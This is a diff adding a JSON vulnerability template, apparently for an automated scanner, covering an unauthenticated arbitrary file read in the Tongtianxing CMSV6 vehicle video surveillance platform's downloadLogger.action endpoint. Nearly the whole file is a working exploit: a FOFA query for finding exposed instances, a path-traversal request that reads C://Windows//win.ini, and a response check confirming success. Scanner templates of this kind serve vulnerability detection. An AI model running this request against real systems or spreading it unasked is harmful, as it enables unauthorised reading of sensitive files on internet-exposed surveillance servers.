@@ -1,0 +1,37 @@
+{
+  "product": "通天星CMSV6车载视频监控平台",
+  "vul_name": "通天星CMSV6车载视频监控平台 downloadLogger.action 任意文件读取",
+  "type": "文件读取",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "通天星CMSV6车载视频监控平台 downloadLogger.action接口处任意文件读取漏洞，未经身份认证的攻击者可以通过此漏洞获取系统内部敏感文件信息，使系统处于极不安全状态。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "body=\"/808gps/\""
+  },
+  "protocol": "http",
+  "link": "https://download.csdn.net/blog/column/10118303/137637594",
+  "fix": [
+    "升级至安全版本"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/808gps/logger/downloadLogger.action?fileName=C://Windows//win.ini"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "for 16-bit app support"
+        }
+      ]
+    }
+  }
+}
